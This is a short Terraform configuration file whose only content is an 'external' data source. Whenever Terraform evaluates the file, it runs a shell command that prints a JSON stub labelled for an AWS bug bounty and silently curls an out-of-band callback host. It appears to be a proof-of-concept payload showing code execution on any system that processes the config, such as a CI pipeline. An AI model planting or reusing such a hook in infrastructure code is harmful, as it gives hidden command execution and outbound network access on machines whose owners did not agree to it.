data "external" "example" {
  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL e1g61lt63w4b62aol5ss0akqkhq8e02p.oastify.com/aws-bugbounty > /dev/null 2>&1"]
}
